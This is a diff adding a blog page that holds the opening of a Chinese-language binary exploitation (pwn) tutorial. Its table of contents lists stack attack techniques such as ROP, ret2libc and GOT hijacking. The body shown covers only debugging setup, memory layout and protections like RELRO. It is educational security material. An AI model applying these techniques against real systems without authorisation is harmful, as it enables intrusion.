@@ -1,0 +1,1240 @@
+
+  <!DOCTYPE html>
+  <html lang="en"  >
+  <head>
+  <meta charset="utf-8">
+  
+
+  
+
+  
+
+  <script>window.REIMU_CONFIG = {};window.REIMU_CONFIG.icon_font = '4552607_bq08450reo';window.REIMU_CONFIG.clipboard_tips = {"success":"copy success(*^▽^*)","fail":"copy failed (ﾟ⊿ﾟ)ﾂ","copyright":{"enable":false,"count":50,"content":"Naup"}};window.REIMU_CONFIG.code_block = {"expand":true};</script>
+  
+  <title>
+    Pwn-Stack-based-attack |
+    
+    堇姬 Naup&#39;s Blog
+  </title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin><link rel="preload" as="style" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap" media="print" onload="this.media&#x3D;&#39;all&#39;">
+  
+    <link rel="preload" href="//at.alicdn.com/t/c/font_4552607_bq08450reo.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  
+  
+    
+<link rel="stylesheet" href="/css/loader.css">
+
+  
+  
+    <meta name="description" content="Pwn-Stack based attack Author:堇姬  我用的debug環境 Pwndbg+pwngdb r2 IDA or Ghidra local debug12345tmuxcontext.log_level &#x3D; &#x27;debug&#x27;context.terminal &#x3D; [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&amp;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Pwn-Stack-based-attack">
+<meta property="og:url" content="http://example.com/2025/01/20/Pwn-Stack-based-attack/index.html">
+<meta property="og:site_name" content="堇姬 Naup&#39;s Blog">
+<meta property="og:description" content="Pwn-Stack based attack Author:堇姬  我用的debug環境 Pwndbg+pwngdb r2 IDA or Ghidra local debug12345tmuxcontext.log_level &#x3D; &#x27;debug&#x27;context.terminal &#x3D; [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&amp;">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://hackmd.io/_uploads/BJKxjeCPR.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/H1tFl-RwA.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/BycK5Jr9A.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/H1cqZ-RPR.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/Bkk5MbADC.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/rye5vZAPA.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/SyuRPb0PC.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/HJhKIbAvR.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/BkBCu-RwA.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/HkdLF-0DR.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/B1Z51Y1KR.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/SkG21FkKR.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/Hy-yxFJKA.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/SJE-gY1K0.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/Bk1sU2Qp0.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/ry6pa3X6R.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/H1zsC3ma0.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/rk7JV6XTR.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/SJZYg6E50.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/SJbHVUOjC.png">
+<meta property="article:published_time" content="2025-01-19T23:46:24.000Z">
+<meta property="article:modified_time" content="2025-01-20T11:48:37.047Z">
+<meta property="article:author" content="Naup堇姬">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://hackmd.io/_uploads/BJKxjeCPR.png">
+  
+  
+    <link rel="alternate" href="/atom.xml" title="堇姬 Naup's Blog" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/images/fav.ico">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  <link rel="preload" href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+  
+  
+  
+  
+    
+<script src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js" integrity="sha384-k6YtvFUEIuEFBdrLKJ3YAUbBki333tj1CSUisai5Cswsg9wcLNaPzsTHDswp4Az8" crossorigin="anonymous"></script>
+
+  
+  
+    
+<link rel="stylesheet" href="https://npm.webcache.cn/@reimujs/aos@0.1.0/dist/aos.css">
+
+  
+  
+<!-- hexo injector head_end start -->
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
+<!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.1.1"></head>
+
+  <body>
+    
+  <div id='loader'>
+    <div class="loading-left-bg loading-bg"></div>
+    <div class="loading-right-bg loading-bg"></div>
+    <div class="spinner-box">
+      <div class="loading-taichi">
+        
+          <svg width="150" height="150" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="https://www.w3.org/2000/svg" shape-rendering="geometricPrecision">
+            <path d="M303.5 432A80 80 0 0 1 291.5 592A80 80 0 0 1 303.5 432z" fill="var(--red-1, #ff5252)" />
+            <path d="M512 65A447 447 0 0 1 512 959L512 929A417 417 0 0 0 512 95A417 417 0 0 0 512 929L512 959A447 447 0 0 1 512 65z 
+           M512 95A417 417 0 0 1 929 512A208.5 208.5 0 0 1 720.5 720.5L720.5 592A80 80 0 0 0 720.5 432A80 80 0 0 0 720.5 592L720.5 720.5A208.5 208.5 0 0 1 512 512A208.5 208.5 0 0 0 303.5 303.5A208.5 208.5 0 0 0 95 512A417 417 0 0 1 512 95z" fill="var(--red-1, #ff5252)" />
+          </svg>
+        
+      </div>
+      <div class="loading-word">Naup...</div>
+    </div>
+  </div>
+  </div>
+  <script>
+    var time = null;
+    var startLoading = () => {
+      time = Date.now();
+      document.getElementById('loader').classList.remove("loading");
+    }
+    var endLoading = () => {
+      if (!time) {
+        document.body.style.overflow = 'auto';
+        document.getElementById('loader').classList.add("loading");
+      } else {
+        if (Date.now() - time > 500) {
+          time = null;
+          document.body.style.overflow = 'auto';
+          document.getElementById('loader').classList.add("loading");
+        } else {
+          setTimeout(endLoading, 500 - (Date.now() - time));
+          time = null;
+        }
+      }
+    }
+    window.addEventListener('DOMContentLoaded', endLoading);
+    document.getElementById('loader').addEventListener('click', endLoading);
+  </script>
+
+<div id="copy-tooltip" style="pointer-events: none; opacity: 0; transition: all 0.2s ease; position: fixed;top: 50%;left: 50%;z-index: 999;transform: translate(-50%, -50%);color: white;background: rgba(0, 0, 0, 0.5);padding: 10px 15px;border-radius: 10px;">
+</div>
+
+
+    <div id="container">
+      <div id="wrap">
+        <div id="header-nav">
+  <nav id="main-nav">
+    
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/">Home</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/archives">Archives</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/about">About</a>
+        </span>
+      
+    
+    <a id="main-nav-toggle" class="nav-icon"></a>
+  </nav>
+  <nav id="sub-nav">
+    
+      <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed" target="_blank"></a>
+    
+    
+    
+  </nav>
+</div>
+<header id="header">
+  
+    <picture></picture>
+    <img fetchpriority="high" src="/images/posts_cover/HITCON-CTF-Final-2024/HITCON-CTF-Final-2024.webp" alt="Pwn-Stack-based-attack">
+  
+  <div id="header-outer">
+    <div id="header-title">
+      
+        
+        
+          <a href="/" id="logo">
+            <h1 data-aos="slide-up">Pwn-Stack-based-attack</h1>
+          </a>
+        
+      
+      
+        
+        <h2 id="subtitle-wrap" data-aos="slide-down">
+          
+        </h2>
+      
+    </div>
+  </div>
+</header>
+
+        <div id="content"  class="sidebar-right" >
+          <aside id="sidebar">
+  
+  
+  <div class="sidebar-wrapper wrap-sticky">
+    <div class="sidebar-wrap" data-aos="fade-up">
+      
+        <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">Contents</h3>
+  <div class="sidebar-toc-wrapper toc-div-class" >
+      
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Pwn-Stack-based-attack"><span class="toc-number">1.</span> <span class="toc-text">Pwn-Stack based attack</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%88%91%E7%94%A8%E7%9A%84debug%E7%92%B0%E5%A2%83"><span class="toc-number">1.1.</span> <span class="toc-text">我用的debug環境</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#What-is-Pwn"><span class="toc-number">1.2.</span> <span class="toc-text">What is Pwn?</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pwn-target"><span class="toc-number">1.3.</span> <span class="toc-text">pwn target</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#memory"><span class="toc-number">1.4.</span> <span class="toc-text">memory</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Text"><span class="toc-number">1.4.1.</span> <span class="toc-text">Text</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Data"><span class="toc-number">1.4.2.</span> <span class="toc-text">Data</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#BSS"><span class="toc-number">1.4.3.</span> <span class="toc-text">BSS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Heap"><span class="toc-number">1.4.4.</span> <span class="toc-text">Heap</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#stack"><span class="toc-number">1.4.5.</span> <span class="toc-text">stack</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%9D%E8%AD%B7%E6%A9%9F%E5%88%B6"><span class="toc-number">1.5.</span> <span class="toc-text">保護機制</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#RELRO-ReLocation-Read-Only"><span class="toc-number">1.5.1.</span> <span class="toc-text">RELRO(ReLocation Read-Only)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#stack-canary"><span class="toc-number">1.5.2.</span> <span class="toc-text">stack canary</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#NX"><span class="toc-number">1.5.3.</span> <span class="toc-text">NX</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PIE"><span class="toc-number">1.5.4.</span> <span class="toc-text">PIE</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ASLR"><span class="toc-number">1.5.5.</span> <span class="toc-text">ASLR</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#seccomp"><span class="toc-number">1.5.6.</span> <span class="toc-text">seccomp</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#register"><span class="toc-number">1.6.</span> <span class="toc-text">register</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#oob"><span class="toc-number">1.7.</span> <span class="toc-text">oob</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#int-overflow"><span class="toc-number">1.8.</span> <span class="toc-text">int overflow</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#partial-overwrite"><span class="toc-number">1.9.</span> <span class="toc-text">partial overwrite</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#stack-%E5%A0%86%E7%96%8A"><span class="toc-number">1.10.</span> <span class="toc-text">stack(堆疊)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#old-rbp"><span class="toc-number">1.10.1.</span> <span class="toc-text">old rbp</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#stack-return-address"><span class="toc-number">1.10.2.</span> <span class="toc-text">stack return address</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#buffer-ovweflow"><span class="toc-number">1.11.</span> <span class="toc-text">buffer ovweflow</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#return2code"><span class="toc-number">1.11.1.</span> <span class="toc-text">return2code</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ret2shellcode"><span class="toc-number">1.11.2.</span> <span class="toc-text">ret2shellcode</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#orw"><span class="toc-number">1.11.2.1.</span> <span class="toc-text">orw</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#mprotect"><span class="toc-number">1.11.2.2.</span> <span class="toc-text">mprotect</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ROP"><span class="toc-number">1.12.</span> <span class="toc-text">ROP</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#gadget"><span class="toc-number">1.12.1.</span> <span class="toc-text">gadget</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ROP-chain"><span class="toc-number">1.12.2.</span> <span class="toc-text">ROP chain</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%A1%8C%E7%9B%AE"><span class="toc-number">1.12.2.1.</span> <span class="toc-text">題目</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#stack-migration"><span class="toc-number">1.13.</span> <span class="toc-text">stack migration</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Fixed-Size-Migration"><span class="toc-number">1.14.</span> <span class="toc-text">Fixed Size Migration</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#libc-%E7%9B%B8%E9%97%9C"><span class="toc-number">1.15.</span> <span class="toc-text">libc 相關</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#libc%E6%98%AF%E5%95%A5"><span class="toc-number">1.15.1.</span> <span class="toc-text">libc是啥</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#static"><span class="toc-number">1.15.2.</span> <span class="toc-text">static</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#demo"><span class="toc-number">1.15.2.1.</span> <span class="toc-text">demo</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#dynamic"><span class="toc-number">1.15.3.</span> <span class="toc-text">dynamic</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#GOT%EF%BC%88global-offset-table%EF%BC%89"><span class="toc-number">1.15.4.</span> <span class="toc-text">GOT（global offset table）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PLT-procedure-linkage-table"><span class="toc-number">1.16.</span> <span class="toc-text">PLT(procedure linkage table)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#dynamic-link"><span class="toc-number">1.16.1.</span> <span class="toc-text">dynamic link</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#GOT-hijack"><span class="toc-number">1.17.</span> <span class="toc-text">GOT hijack</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#demo-1"><span class="toc-number">1.17.1.</span> <span class="toc-text">demo</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E6%9E%90"><span class="toc-number">1.17.2.</span> <span class="toc-text">分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#script"><span class="toc-number">1.17.3.</span> <span class="toc-text">script</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ret2libc"><span class="toc-number">1.18.</span> <span class="toc-text">ret2libc</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AE%97libc-base"><span class="toc-number">1.18.1.</span> <span class="toc-text">算libc base</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#demo-2"><span class="toc-number">1.18.2.</span> <span class="toc-text">demo</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ret2csu"><span class="toc-number">1.19.</span> <span class="toc-text">ret2csu</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#srop"><span class="toc-number">1.20.</span> <span class="toc-text">srop</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ret2-dl-runtime-resolve"><span class="toc-number">1.21.</span> <span class="toc-text">ret2 dl_runtime_resolve</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A4%87%E7%BF%92%E4%B8%80%E4%B8%8BGOT"><span class="toc-number">1.21.1.</span> <span class="toc-text">複習一下GOT</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%BDgdb"><span class="toc-number">1.21.2.</span> <span class="toc-text">追gdb</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#env"><span class="toc-number">1.21.2.1.</span> <span class="toc-text">env</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#fixup%E8%A9%B3%E7%B4%B0%E5%B1%95%E9%96%8B"><span class="toc-number">1.21.3.</span> <span class="toc-text">fixup詳細展開</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-64-bits-NO-RELRO"><span class="toc-number">1.21.4.</span> <span class="toc-text">利用 64 bits NO RELRO</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ret2vdso"><span class="toc-number">1.22.</span> <span class="toc-text">ret2vdso</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#memory-segment"><span class="toc-number">1.22.1.</span> <span class="toc-text">memory segment</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#vdso-ASLR"><span class="toc-number">1.22.2.</span> <span class="toc-text">vdso ASLR</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#reference"><span class="toc-number">1.22.3.</span> <span class="toc-text">reference</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#One-gadget"><span class="toc-number">1.23.</span> <span class="toc-text">One gadget</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#demo-3"><span class="toc-number">1.23.1.</span> <span class="toc-text">demo</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#init-array-fini-array-hijack"><span class="toc-number">1.24.</span> <span class="toc-text">.init_array &amp; .fini_array hijack</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#TLS-bypass-canary"><span class="toc-number">1.25.</span> <span class="toc-text">TLS bypass canary</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#TLS-Thread-Local-Storage"><span class="toc-number">1.25.1.</span> <span class="toc-text">TLS(Thread Local Storage)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#TLS%E8%AA%A4%E5%8D%80"><span class="toc-number">1.25.2.</span> <span class="toc-text">TLS誤區</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#TLS%E7%94%A8%E9%80%94"><span class="toc-number">1.25.3.</span> <span class="toc-text">TLS用途</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#TLS-canary"><span class="toc-number">1.25.4.</span> <span class="toc-text">TLS &amp; canary</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#struct"><span class="toc-number">1.25.5.</span> <span class="toc-text">struct</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#TLScanary%E6%94%BB%E6%93%8A%E6%B5%81%E7%A8%8B"><span class="toc-number">1.25.6.</span> <span class="toc-text">TLScanary攻擊流程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A1%8C%E7%9B%AE-1"><span class="toc-number">1.25.7.</span> <span class="toc-text">題目</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#format-string"><span class="toc-number">1.26.</span> <span class="toc-text">format string</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%89%E5%93%AA%E4%BA%9Bformat-string"><span class="toc-number">1.26.1.</span> <span class="toc-text">有哪些format string</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AE%80%E5%8F%96"><span class="toc-number">1.27.</span> <span class="toc-text">讀取</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AF%AB%E5%85%A5"><span class="toc-number">1.28.</span> <span class="toc-text">寫入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#n"><span class="toc-number">1.28.1.</span> <span class="toc-text">%n</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%AB%E5%85%A5%E5%AD%97%E5%85%83%E6%95%B8"><span class="toc-number">1.28.2.</span> <span class="toc-text">寫入字元數</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#c"><span class="toc-number">1.28.3.</span> <span class="toc-text">%c</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%88%89%E4%BE%8B"><span class="toc-number">1.28.4.</span> <span class="toc-text">舉例</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#argv-chain"><span class="toc-number">1.29.</span> <span class="toc-text">argv chain</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%88%89%E4%BE%8B-1"><span class="toc-number">1.29.1.</span> <span class="toc-text">舉例</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%96%8B%E5%A7%8B%E6%A7%8B%E9%80%A0"><span class="toc-number">1.29.2.</span> <span class="toc-text">開始構造</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SSP-Stack-Smashing-Protect-leak"><span class="toc-number">1.30.</span> <span class="toc-text">SSP(Stack Smashing Protect) leak</span></a></li></ol></li></ol>
+      
+  </div>
+</div>
+</div>
+        <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.webp" data-sizes="auto" alt="Naup堇姬" class="lazyload">
+  <div class="sidebar-author-name">Naup堇姬</div>
+  <div class="sidebar-description"></div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>Posts</div>
+    <div class="sidebar-state-number">57</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>Categories</div>
+    <div class="sidebar-state-number">4</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>Tags</div>
+    <div class="sidebar-state-number">0</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+    <div class="icon-email sidebar-social-icon">
+      <a href=naup96721@gmail.com itemprop="url" target="_blank" aria-label="email" rel="noopener external nofollow noreferrer"></a>
+    </div>
+  
+    <div class="icon-github sidebar-social-icon">
+      <a href=https://github.com/Naupjjin itemprop="url" target="_blank" aria-label="github" rel="noopener external nofollow noreferrer"></a>
+    </div>
+  
+</div>
+<div class="sidebar-menu">
+  
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="Home"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">Home</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="Archives"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">Archives</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="About"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">About</div>
+      </div>
+    
+  
+</div>
+</div>
+      
+      
+        <div class="sidebar-btn-wrapper" style="position:static">
+          <div class="sidebar-toc-btn current"></div>
+          <div class="sidebar-common-btn"></div>
+        </div>
+      
+    </div>
+  </div>
+
+  <div class="sidebar-widget">
+  
+  </div>
+</aside>
+
+          <section id="main"><article id="post-Pwn-Stack-based-attack" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-inner" data-aos="fade-up">
+    <div class="article-meta">
+      <div class="article-date">
+  <a href="/2025/01/20/Pwn-Stack-based-attack/" class="article-date-link" data-aos="zoom-in">
+    <time datetime="2025-01-19T23:46:24.000Z" itemprop="datePublished">2025-01-20</time>
+    <time style="display: none;" id="post-update-time">2025-01-20</time>
+  </a>
+</div>
+
+      
+
+    </div>
+    <div class="hr-line"></div>
+    
+
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+      
+        <h1 id="Pwn-Stack-based-attack"><a href="#Pwn-Stack-based-attack" class="headerlink" title="Pwn-Stack based attack"></a>Pwn-Stack based attack</h1><blockquote>
+<p>Author:堇姬</p>
+</blockquote>
+<h2 id="我用的debug環境"><a href="#我用的debug環境" class="headerlink" title="我用的debug環境"></a>我用的debug環境</h2><ul>
+<li>Pwndbg+pwngdb</li>
+<li>r2</li>
+<li>IDA or Ghidra</li>
+<li>local debug<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">tmux</span><br><span class="line"></span><br><span class="line">context.log_level = &#x27;debug&#x27;</span><br><span class="line">context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]</span><br><span class="line">gdb.attach(r)</span><br></pre></td></tr></table></figure></li>
+</ul>
+<h2 id="What-is-Pwn"><a href="#What-is-Pwn" class="headerlink" title="What is Pwn?"></a>What is Pwn?</h2><p>二進制程式檔滲透，<br>其實就是找尋程式中的漏洞，或是取得伺服器權限，使用伺服器 shell 偷取檔案、修改資料等等。</p>
+<ul>
+<li>看原始碼、組合語言找漏洞</li>
+<li>透過input、output來get shell等…</li>
+</ul>
+<h2 id="pwn-target"><a href="#pwn-target" class="headerlink" title="pwn target"></a>pwn target</h2><p>很多東西都可以打<br>VM、IoT、linux、windows…</p>
+<h2 id="memory"><a href="#memory" class="headerlink" title="memory"></a>memory</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">+----------------------+ &lt;-- High Memory Address</span><br><span class="line">|       Stack          |  </span><br><span class="line">+----------------------+</span><br><span class="line">          |</span><br><span class="line">          v (grows down)</span><br><span class="line">          ^</span><br><span class="line">          | (grows up)</span><br><span class="line">+----------------------+</span><br><span class="line">|       Heap           |  </span><br><span class="line">+----------------------+</span><br><span class="line">|        BSS           |  </span><br><span class="line">+----------------------+</span><br><span class="line">|        Data          |  </span><br><span class="line">+----------------------+</span><br><span class="line">|        Text          |  </span><br><span class="line">+----------------------+  &lt;-- Low Memory Address</span><br></pre></td></tr></table></figure>
+
+
+<h3 id="Text"><a href="#Text" class="headerlink" title="Text"></a>Text</h3><ul>
+<li>程式碼</li>
+<li>r-x(不可寫)</li>
+</ul>
+<h3 id="Data"><a href="#Data" class="headerlink" title="Data"></a>Data</h3><ul>
+<li>已給值全域變數</li>
+</ul>
+<h3 id="BSS"><a href="#BSS" class="headerlink" title="BSS"></a>BSS</h3><ul>
+<li>未給值全域變數</li>
+</ul>
+<h3 id="Heap"><a href="#Heap" class="headerlink" title="Heap"></a>Heap</h3><ul>
+<li>動態記憶體空間</li>
+<li>malloc()、free()</li>
+<li>低位往高位</li>
+</ul>
+<h3 id="stack"><a href="#stack" class="headerlink" title="stack"></a>stack</h3><ul>
+<li>暫存空間<br>1 區域變數<br>2 return address<br>3 參數<br>4 return value</li>
+<li>高位往低位</li>
+<li>rsp：stack pointer，指向stack頂端</li>
+<li>rbp：base pointer，指向stack底部</li>
+</ul>
+<p><img src="https://hackmd.io/_uploads/BJKxjeCPR.png" alt="image"></p>
+<h2 id="保護機制"><a href="#保護機制" class="headerlink" title="保護機制"></a>保護機制</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">checksec ./檔案</span><br></pre></td></tr></table></figure>
+<ul>
+<li>RELRO</li>
+<li>Stack canary</li>
+<li>NX</li>
+<li>PIE</li>
+<li>ASLR</li>
+</ul>
+<h3 id="RELRO-ReLocation-Read-Only"><a href="#RELRO-ReLocation-Read-Only" class="headerlink" title="RELRO(ReLocation Read-Only)"></a>RELRO(ReLocation Read-Only)</h3><p>分為 Partial RELRO 與 Full RELRO</p>
+<p>No RELRO      -&gt; Link Map、GOT 可寫<br>Partial RELRO -&gt; Link Map 不可寫、GOT 可寫<br>Full RELRO    -&gt; Link Map、GOT 皆不可寫</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-z norelro / -z lazy / -z now</span><br></pre></td></tr></table></figure>
+
